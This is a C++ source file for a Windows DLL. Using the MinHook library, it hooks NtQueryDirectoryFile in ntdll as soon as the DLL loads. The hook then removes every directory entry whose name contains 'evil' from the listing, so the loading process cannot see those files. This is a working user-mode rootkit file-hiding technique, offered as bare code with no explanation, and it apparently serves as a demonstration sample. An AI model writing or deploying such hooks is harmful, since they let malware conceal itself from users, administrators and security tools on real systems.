#include "..\include\MinHook.h"
#include "nt_structs.h"

typedef NTSTATUS(*orintqdf)(IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG FileInformationLength,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan);

orintqdf Original_NtQueryDirectoryFile;
orintqdf New_NtQueryDirectoryFile;

NTSTATUS NTAPI Hooked_NtQueryDirectoryFile(HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG FileInformationLength,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN ReturnSingleEntry,
	PUNICODE_STRING FileName,
	BOOLEAN RestartScan)

{
	NTSTATUS Status = New_NtQueryDirectoryFile(FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		FileInformationLength,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan);

	if (FileInformationClass == 37)
	{
		PFILE_ID_BOTH_DIR_INFORMATION prev = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
		PFILE_ID_BOTH_DIR_INFORMATION curr = PFILE_ID_BOTH_DIR_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);
		
		while (prev->NextEntryOffset != NULL) 
		{
			//check if the current item in the list of content
			if (NULL != wcsstr(&curr->FileName[0], L"evil"))
			{
				//checks if the list is over
				if (curr->NextEntryOffset == 0) 
				{
					prev->NextEntryOffset = 0;		// if above item is at the end of the list
				}
				else 
				{
					//remove the "evil" item
					prev->NextEntryOffset += curr->NextEntryOffset;
				}
				curr = prev;
			}
			prev = curr;
			//next item in the list
			curr = PFILE_ID_BOTH_DIR_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
		}
	}

	if (FileInformationClass == 2)
	{
		PFILE_FULL_DIR_INFORMATION prev = (PFILE_FULL_DIR_INFORMATION)FileInformation;
		PFILE_FULL_DIR_INFORMATION curr = PFILE_FULL_DIR_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

		while (prev->NextEntryOffset != NULL) 
		{
			//check if the current item in the list of content
			if (NULL != wcsstr(&curr->FileName[0], L"evil"))
			{
				//checks if the list is over
				if (curr->NextEntryOffset == 0) 
				{
					prev->NextEntryOffset = 0;		// if above item is at the end of the list
				}
				else 
				{
					//remove the "evil" item
					prev->NextEntryOffset += curr->NextEntryOffset;
				}
				curr = prev;
			}
			prev = curr;
			//next item in the list
			curr = PFILE_FULL_DIR_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
		}
	}
	return Status;
}

bool set_nt_hook()
{
	HMODULE ntdll = GetModuleHandle("ntdll.dll");
	Original_NtQueryDirectoryFile = (orintqdf)GetProcAddress(ntdll, "NtQueryDirectoryFile");

	if (MH_Initialize() != MH_OK) 
	{ 
		return false; 
	}

	if (MH_CreateHook(Original_NtQueryDirectoryFile, &Hooked_NtQueryDirectoryFile, (LPVOID*)&New_NtQueryDirectoryFile) != MH_OK)
	{ 
		return false; 
	}

	if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) 
	{ 
		return false; 
	}
	return true;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		if (!set_nt_hook()) 
		{
			return FALSE;
		}
		break;
	case DLL_PROCESS_DETACH:
		MH_DisableHook(Original_NtQueryDirectoryFile);
		MH_Uninitialize();
		break;
	}
	return TRUE;
}